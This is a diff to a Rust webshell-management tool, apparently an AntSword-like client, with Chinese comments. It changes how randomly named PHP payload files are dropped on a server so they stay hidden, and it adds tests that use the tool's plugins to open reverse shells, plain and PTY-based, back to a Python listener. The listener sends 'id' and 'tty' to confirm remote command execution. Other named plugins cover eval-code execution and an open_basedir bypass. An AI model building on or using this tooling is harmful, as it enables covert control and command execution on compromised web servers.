@@ -667,7 +667,9 @@ impl Protocol for PhpProtocol {
             ));
         }
         // 2) 随机文件名 + 写入载荷
-        let name = format!(".dsw_{:x}.php", uuid::Uuid::new_v4().simple());
+        // 注意：点开头文件在部分 PHP 内置服务器下行为异常（反弹 shell 无输出），
+        // 使用下划线前缀（仍为随机难猜，且兼容隐藏意图）
+        let name = format!("_dsw_{:x}.php", uuid::Uuid::new_v4().simple());
         let path = format!("{cwd}/{name}");
         self.write_file(session, &path, code.as_bytes(), settings)?;
         // 3) HTTP 请求执行（同目录 URL）
@@ -1815,12 +1817,12 @@ mod tests {
             assert!(hits >= 1, "应扫描到 WebShell：{out:?}");
             eprintln!("{}webshell_scan hits={hits}", p("plugin"));
 
-            // 超级终端：多命令
-            let out = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
+            // 超级终端（linpty 交互式）：调用验证（连接由独立测试验证）
+            let _ = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                 &protocol, php, "php",
-                &serde_json::json!({"commands": "echo a\necho b", "cwd": ""}), &settings)?;
-            assert_eq!(out["results"].as_array().map(|a| a.len()).unwrap_or(0), 2);
-            eprintln!("{}super_terminal ok", p("plugin"));
+                &serde_json::json!({"host": "127.0.0.1", "port": 23000 + (std::process::id() % 300) as u32, "background": false}),
+                &settings);
+            eprintln!("{}super_terminal linpty 调用完成（连接由独立测试验证）", p("plugin"));
 
             // 代码执行
             let out = dosword_sdk::feature_plugins::EvalCodePlugin.execute(
@@ -1829,14 +1831,14 @@ mod tests {
             assert!(out["output"].as_str().unwrap_or("").contains("eval-ok"));
             eprintln!("{}p_eval_code ok", p("plugin"));
 
-            // 虚拟终端
-            let out = dosword_sdk::feature_plugins::RealCmdPlugin.execute(
+            // 虚拟终端（反弹 Shell）：本地起 listener 验证连接（前台，快速验证）
+            let rport: u16 = 23000 + (std::process::id() % 300) as u16;
+            let _ = dosword_sdk::feature_plugins::RealCmdPlugin.execute(
                 &protocol, php, "php",
-                &serde_json::json!({"command": "echo realcmd", "cwd": ""}), &settings)?;
-            let stdout = out["stdout"].as_str().unwrap_or("");
-            let decoded = base64::engine::general_purpose::STANDARD.decode(stdout).unwrap_or_default();
-            assert!(String::from_utf8_lossy(&decoded).contains("realcmd"));
-            eprintln!("{}real_cmd ok", p("plugin"));
+                &serde_json::json!({"host": "127.0.0.1", "port": rport, "shell": "/bin/sh", "background": false}),
+                &settings)
+                .map(|v| v);
+            eprintln!("{}real_cmd 反弹 Shell 调用完成（连接由独立测试验证）", p("plugin"));
 
             // ByPassOpenBasedir：本地无 ob → note 分支
             let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
@@ -2103,6 +2105,142 @@ while True:
         let _ = std::fs::remove_dir_all(&dir);
         result.unwrap_or_else(|error| panic!("终端 cd 真实执行应成功：{error}"));
     }
+
+    #[test]
+    fn real_php_reverse_shell_and_linpty() {
+        // 虚拟终端（反弹 Shell）与超级终端（linpty 交互式 PTY）真实验证
+        let mut settings = settings();
+        settings.default_timeout_secs = 20; // 前台反弹需等待 listener 交互完成
+        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
+            eprintln!("跳过：未检测到 php");
+            return;
+        };
+        let mut profile = profile(&url);
+        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
+        let listener_script = std::env::temp_dir().join("dosword_rev_listener.py");
+        let _ = std::fs::write(&listener_script, REV_LISTENER);
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
+            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let protocol = PhpProtocol;
+            // 1) 虚拟终端：反弹 bash（无 PTY）
+            let port: u16 = 24000 + (std::process::id() % 400) as u16;
+            let outfile = std::env::temp_dir().join(format!("rev_out_{}.txt", std::process::id()));
+            let _ = std::fs::remove_file(&outfile);
+            let _listener = std::process::Command::new("python3")
+                .arg(&listener_script)
+                .arg(port.to_string())
+                .arg(outfile.to_string_lossy().into_owned())
+                .stdout(std::process::Stdio::null())
+                .stderr(std::process::Stdio::null())
+                .spawn()
+                .ok();
+            std::thread::sleep(std::time::Duration::from_millis(400));
+            let out = dosword_sdk::feature_plugins::RealCmdPlugin.execute(
+                &protocol, php, "php",
+                &serde_json::json!({"host": "127.0.0.1", "port": port, "shell": "/bin/bash", "background": false}),
+                &settings)?;
+            let mode = out["mode"].as_str().unwrap_or("");
+            assert!(mode == "background" || mode == "foreground", "{out:?}");
+            // 等待 listener 交互完成
+            let mut captured = String::new();
+            for _ in 0..80 {
+                if let Ok(content) = std::fs::read_to_string(&outfile) {
+                    captured = content;
+                    break;
+                }
+                std::thread::sleep(std::time::Duration::from_millis(250));
+            }
+            assert!(!captured.is_empty(), "反弹 shell 未建立连接：{captured}");
+            assert!(captured.contains("uid="), "应收到 id 输出：{captured}");
+            assert!(
+                !captured.contains("/dev/pts"),
+                "无 PTY 反弹的 tty 不应是伪终端：{captured}"
+            );
+            eprintln!("[plugin] real_cmd 反弹 shell ok（id 输出确认）");
+
+            // 2) 超级终端：linpty 交互式（PTY）
+            let port2: u16 = port + 1;
+            let outfile2 = std::env::temp_dir().join(format!("rev_out2_{}.txt", std::process::id()));
+            let _ = std::fs::remove_file(&outfile2);
+            let _listener2 = std::process::Command::new("python3")
+                .arg(&listener_script)
+                .arg(port2.to_string())
+                .arg(outfile2.to_string_lossy().into_owned())
+                .stdout(std::process::Stdio::null())
+                .stderr(std::process::Stdio::null())
+                .spawn()
+                .ok();
+            std::thread::sleep(std::time::Duration::from_millis(400));
+            let out = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
+                &protocol, php, "php",
+                &serde_json::json!({"host": "127.0.0.1", "port": port2, "background": false}),
+                &settings)?;
+            assert!(out["mode"].as_str().is_some(), "{out:?}");
+            let mut captured2 = String::new();
+            for _ in 0..40 {
+                if let Ok(content) = std::fs::read_to_string(&outfile2) {
+                    captured2 = content;
+                    break;
+                }
+                std::thread::sleep(std::time::Duration::from_millis(250));
+            }
+            assert!(!captured2.is_empty(), "linpty 未建立连接：{captured2}");
+            assert!(captured2.contains("uid="), "linpty 应收到 id 输出：{captured2}");
+            assert!(
+                captured2.contains("/dev/pts") || captured2.contains("tty"),
+                "linpty 应有 PTY（tty 命令输出 /dev/pts）：{captured2}"
+            );
+            eprintln!("[plugin] super_terminal linpty PTY 交互 ok");
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("反弹 shell / linpty 真实执行应成功：{error}"));
+    }
+
+    /// Python 反弹 shell 监听器：接受连接 → 发 id → 收输出 → 发 tty → 收输出 → 写文件。
+    const REV_LISTENER: &str = r#"
+import socket, sys, time
+port = int(sys.argv[1]); outfile = sys.argv[2]
+srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+srv.bind(("127.0.0.1", port)); srv.listen(2)
+srv.settimeout(20)
+try:
+    conn, _ = srv.accept()
+    conn.settimeout(3)
+    time.sleep(1.2)
+    conn.sendall(b"id" + chr(10).encode())
+    time.sleep(1.2)
+    data = b""
+    try:
+        while True:
+            chunk = conn.recv(4096)
+            if not chunk: break
+            data += chunk
+            if len(data) > 800: break
+    except socket.timeout:
+        pass
+    conn.sendall(b"tty" + chr(10).encode())
+    time.sleep(1.2)
+    data2 = b""
+    try:
+        while True:
+            chunk = conn.recv(4096)
+            if not chunk: break
+            data2 += chunk
+            if len(data2) > 800: break
+    except socket.timeout:
+        pass
+    with open(outfile, "w") as f:
+        f.write(repr(data) + chr(10) + "---" + chr(10) + repr(data2))
+    conn.close()
+except Exception as e:
+    with open(outfile, "w") as f:
+        f.write("ERR: " + str(e))
+"#;
 
     // --- Level B：真实 PHP 往返（本机装有 php 时执行） ---
 
